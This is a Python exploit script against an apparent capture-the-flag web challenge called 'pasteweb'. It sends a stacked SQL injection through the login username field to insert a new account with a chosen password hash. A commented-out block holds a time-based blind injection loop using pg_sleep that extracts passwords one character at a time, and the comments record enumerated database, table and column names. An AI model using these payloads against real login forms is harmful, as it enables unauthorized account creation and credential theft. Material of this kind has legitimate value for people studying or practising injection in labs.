import requests
from string import printable 
from time import time
import sys


url = 'https://pasteweb.ctf.zoolab.org/'
Result = ""

payload = f"insert into pasteweb_accounts (user_id, user_account, user_password) values (994,'hacker09','4a7d1ed414474e4033ac29ccb8653d9b')"

#payload = f"' or 1=(insert into pasteweb_accounts (user_id, user_account, user_password) values (200,test00000,16d7a4fca7442dda3ad93c9a726597e4)) --' "
#payload = f" select {insert} from pasteweb_accounts "


username = f"1' ; " + payload  + "; -- -"
current_time = int(time())
value = {
    'username': username,
    'password': '',
    'current_time': current_time
}
r = requests.post(url, data=value, timeout=10)
print(r.status_code)
print("finish!")

"""
for i in range(1, 50):
    for j in printable:
        
        
        payload = f" select case when substring(user_password,{i},1)='{j}' then pg_sleep(1.5) else pg_sleep(0) end from pasteweb_accounts limit 1"
        username = f"1' ; " + payload  + "; -- -"
        current_time = int(time())
        value = {
            'username': username,
            'password': '',
            'current_time': current_time
        }
        print(i,j)


        if ord(j) == 12:
            print("Answer : ", Result)
            sys.exit()
            break
        else :
            try :
                r = requests.post(url, data=value, timeout=1)

            except : 
                print("error")
                Result += j
                print("Answer : ", Result)
                break


        




       #name = > pastewebdb
        #username = f"1' ; select case when substr(current_database(),{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from pg_database limit 1 -- -"
        #table name => pasteweb_accounts 、fl4gR4aHCb1、p3cr3teb4a1counts、p3cr3peb4a1counts、p3cf3peb4a1cables、p3cf3leb4a1cables
        #username = f"1' ; select case when substring(table_name,{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from information_schema.tables order by table_name -- -"
        #columns dump time based => user_id、user_account、user_aacounrd、user_a910unrd803、user_aacounrd | fl4g
        #username = f"1' ; select case when substring(column_name,{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from information_schema.columns where table_name='s3cr3t_t4b1e'  ; -- -"
        #column value
"""